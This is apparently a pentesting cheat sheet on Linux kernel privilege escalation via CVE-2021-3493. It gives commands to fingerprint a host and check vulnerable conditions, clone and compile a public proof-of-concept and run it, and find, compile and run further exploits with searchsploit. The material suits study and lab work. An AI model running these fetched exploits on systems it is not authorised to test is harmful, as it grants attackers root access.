General Steps to Exploit Linux Kernel Vulnerabilities (e.g., CVE-2021-3493)

Exploiting Linux kernel vulnerabilities involves leveraging weaknesses in the kernel or user namespace configurations to escalate privileges. Here's a generic approach using CVE-2021-3493 as an example:

âœ… Identify Kernel Version and OS
Check the system's kernel version and OS type:
    uname -r
    lsb_release -a
=====================================================================================================================================
Approch 1:

âœ… 1. Check for Vulnerability Conditions
Ensure the vulnerability applies to the current system. For CVE-2021-3493:
Kernel is unpatched (Ubuntu kernels like 4.15.0-76-generic).

overlayfs module is enabled:
    lsmod | grep overlay

User namespaces are allowed:
    cat /proc/sys/kernel/unprivileged_userns_clone

âœ… 2. Download Exploit
Clone or download a known proof-of-concept (PoC):

git clone https://github.com/briskets/CVE-2021-3493.git
    cd CVE-2021-3493

âœ… 3. Compile Exploit Code
Use gcc or make to compile:

    make
# or manually
    gcc exploit.c -o exploit

âœ… 4. Run the Exploit
Execute the compiled binary to trigger the exploit:

./exploit

=====================================================================================================================================

Approch 2:

searchsploit is a command-line tool from the Exploit Database (ExploitDB) that allows security researchers and penetration testers to search for known public exploits locally.

âœ… 1. Install searchsploit

    sudo apt update
    sudo apt install exploitdb

Or clone manually:

    git clone https://github.com/offensive-security/exploitdb.git /opt/exploitdb

ðŸ”Ž 2. Search for Exploits

  searchsploit <keyword>

Examples:

By CVE:
    searchsploit CVE-2021-3493

By software or kernel version:
    searchsploit Linux Kernel 4.15
    searchsploit Ubuntu 18.04
    searchsploit apache 2.4

Use -t to display titles only:
    searchsploit -t kernel privilege escalation

ðŸ“‚ 3. Locate Exploit Files
    searchsploit output includes paths like:
        Linux Kernel 4.15 - OverlayFS Local Privilege Escalation | linux/local/51080.c

To copy:
    searchsploit -m linux/local/51080.c

ðŸ›  4. Compile and Test
Once copied, compile and test:
    gcc 51080.c -o exploit
    ./exploit

ðŸ”„ 5. Update Database
    searchsploit -u
